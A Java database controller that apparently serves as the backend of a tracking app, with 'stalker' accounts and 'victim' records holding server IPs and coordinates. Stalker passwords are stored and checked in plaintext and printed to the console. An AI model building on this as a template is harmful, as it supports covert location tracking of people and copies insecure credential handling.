import com.google.gson.Gson;
import com.mysql.jdbc.Connection;
import com.mysql.jdbc.jdbc2.optional.MysqlDataSource;

import java.sql.*;
import java.text.DateFormat;
import java.text.ParseException;
import java.text.SimpleDateFormat;
import java.util.Calendar;

public class DbController {

    private java.sql.Connection conn;
    private Statement stmt = null;
    private PreparedStatement preparedStatement=null;
    MysqlDataSource dataSource;

    DbController()
    {
        dataSource=new MysqlDataSource();
        dataSource.setUser(Keys.user);
        dataSource.setPassword(Keys.password);
        dataSource.setDatabaseName(Keys.databaseName);
        dataSource.setServerName(Keys.name);

        try {
            conn=dataSource.getConnection();

        } catch (SQLException e) {
            e.printStackTrace();
        }
    }


    boolean addStalker(Stalker stalker)
    {
        String query="INSERT INTO STALKER VALUES(?,?,?,?,?,?)";
        DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
        String date="01-01-2018";
        try {
            java.util.Date myDate = formatter.parse(date);
            java.sql.Date sqlDate = new java.sql.Date(myDate.getTime());
            preparedStatement=conn.prepareStatement(query);
            preparedStatement.setString(1,null);
            preparedStatement.setString(2,stalker.getName());
            preparedStatement.setString(3,stalker.getPassword());
            preparedStatement.setString(4,stalker.getEmail());
            preparedStatement.setDate(5,sqlDate);
            preparedStatement.setDate(6,sqlDate);
            preparedStatement.executeUpdate();
            return true;
        } catch (SQLException e) {
            e.printStackTrace();
        }catch (ParseException e) {
            e.printStackTrace();
        }
        return false;
    }

    String getStalker(String name,String password)
    {
        System.out.println(name+password);
        String query="SELECT * FROM STALKER WHERE userName=? AND userPassword=?";
        try
        {
            preparedStatement=conn.prepareStatement(query);
            preparedStatement.setString(1,name);
            preparedStatement.setString(2,password);
            ResultSet set=preparedStatement.executeQuery();
            while (set.next())
            {
                String userName=set.getString(2);
                String userEmail=set.getString(4);

                return userName +" " + userEmail;
            }

        } catch (SQLException e) {
            e.printStackTrace();
        }


        return "";
    }

    String updateParams(Integer id,String params)
    {
        String query="UPDATE VICTIM SET cordinates=? WHERE STALKER_idSTALKER= ?";

        try
        {
            preparedStatement=conn.prepareStatement(query);
            preparedStatement.setString(1,params);
            preparedStatement.setInt(2,id.intValue());
            preparedStatement.executeUpdate();
            System.out.println("update params");
            return "SUCCESS";
        } catch (SQLException e) {
            e.printStackTrace();
        }
        return "";
    }


    boolean addVictim(Victim victim)
    {

        String query="INSERT INTO VICTIM VALUES(?,?,?,?,?,?)";
        DateFormat formatter = new SimpleDateFormat("yyyy-MM-dd");
        String date="01-01-2018";
        try
        {
            java.util.Date myDate = formatter.parse(date);
            java.sql.Date sqlDate = new java.sql.Date(myDate.getTime());
            preparedStatement=conn.prepareStatement(query);
            preparedStatement.setString(1,null);
            preparedStatement.setString(2,victim.getName());
            preparedStatement.setDate(3,sqlDate);
            preparedStatement.setString(4,victim.getServerIp());
            preparedStatement.setString(5,victim.getCordinates());
            preparedStatement.setInt(6,victim.getStalkerId());

            preparedStatement.executeUpdate();

            return true;

        } catch (SQLException e) {
            e.printStackTrace();
        } catch (ParseException e) {
            e.printStackTrace();
        }

        return false;
    }

    Victim getVictim(int id,String name)
    {
        String query="SELECT * FROM VICTIM WHERE idVICTIM=? AND nameVICTIM=?";
        Victim victim;
        try
        {
            preparedStatement=conn.prepareStatement(query);
            preparedStatement.setInt(1,id);
            preparedStatement.setString(2,name);
            ResultSet set=preparedStatement.executeQuery();

            while (set.next())
            {
                victim=new Victim(set.getString(2),set.getInt(1),set.getInt(6),set.getDate(3).toString(),set.getString(4),set.getString(5));
                return victim;
            }


        } catch (SQLException e) {
            e.printStackTrace();
        }

        return new Victim();
    }

}
